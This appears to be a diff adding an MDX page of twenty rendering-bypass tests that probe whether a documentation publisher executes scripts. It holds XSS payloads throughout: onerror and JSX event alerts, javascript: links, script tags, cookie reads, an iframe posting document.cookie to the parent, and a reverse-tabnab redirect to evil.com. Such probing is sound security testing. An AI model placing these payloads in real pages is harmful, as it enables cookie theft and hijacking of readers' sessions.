@@ -1,0 +1,105 @@
+---
+title: Rendering Bypass Tests
+subtitle: Testing expression evaluation in published docs
+slug: bypass-tests
+---
+
+## Test 1: dangerouslySetInnerHTML (React escape hatch)
+
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+
+## Test 2: JSX event handlers (not HTML attributes)
+
+<div onClick={() => alert('jsx-onclick')}>Click me - JSX onClick</div>
+
+<button onMouseOver={() => alert('jsx-hover')}>Hover me - JSX onMouseOver</button>
+
+## Test 3: React.createElement
+
+{React.createElement('img', {src: 'x', onError: () => alert('createElement')})}
+
+## Test 4: Expression in href attribute
+
+<a href={'javascript:alert("href-expr")'}>Click - expression href</a>
+
+## Test 5: Template literal in href
+
+<a href={`javascript:${'alert(1)'}`}>Click - template href</a>
+
+## Test 6: Export with side effect
+
+export const leak = typeof document !== 'undefined' ? document.cookie : 'ssr'
+
+Leaked: {leak}
+
+## Test 7: Component with render prop
+
+{(() => {
+  const el = typeof document !== 'undefined' 
+    ? document.createElement('div') 
+    : null;
+  if (el) el.innerHTML = '<b>DOM-created</b>';
+  return el ? el.innerHTML : 'no-dom';
+})()}
+
+## Test 8: Markdown HTML block (not JSX)
+
+<div>
+<script>alert('markdown-html-block')</script>
+</div>
+
+## Test 9: Expression returning JSX
+
+{<img src="x" onError={() => alert('jsx-return')} />}
+
+## Test 10: Ref callback injection
+
+<input ref={(el) => { if(el) el.value = document.cookie }} />
+
+## Test 11: Style with expression
+
+<div style={{background: `url('https://example.com/leak?c=${typeof document !== 'undefined' ? 'has-doc' : 'no-doc'}')` }}>Style expression probe</div>
+
+## Test 12: Anchor with target and expression
+
+<a href="https://example.com" target="_blank" rel="" onClick={() => {window.opener && window.opener.location.replace('https://evil.com')}}>Reverse tabnab test</a>
+
+## Test 13: SVG with JSX events
+
+<svg width="100" height="20" onClick={() => alert('svg-jsx-click')}>
+  <rect width="100" height="20" fill="red" />
+  <text x="10" y="15" fill="white">Click SVG</text>
+</svg>
+
+## Test 14: Iframe srcdoc
+
+<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>" />
+
+## Test 15: Object data URI
+
+<object data="data:text/html,<script>alert('object-data')</script>" type="text/html" width="200" height="50" />
+
+## Test 16: Link stylesheet injection
+
+<link rel="stylesheet" href="https://example.com/evil.css" />
+
+## Test 17: Class name expression
+
+<div className={(() => { typeof document !== 'undefined' && (document.title = 'XSS-' + document.domain); return 'test'; })()}>Class expression side effect</div>
+
+## Test 18: Key prop side effect
+
+<div key={(() => { return 'side-effect-key'; })()}>Key prop test</div>
+
+## Test 19: Spread props
+
+<div {...{onMouseEnter: () => alert('spread-event')}}>Spread props hover test</div>
+
+## Test 20: useEffect equivalent via component
+
+{(() => {
+  if (typeof window !== 'undefined') {
+    window.__xss_probe = 'executed-' + document.domain;
+  }
+  return window?.__xss_probe || 'no-window';
+})()}
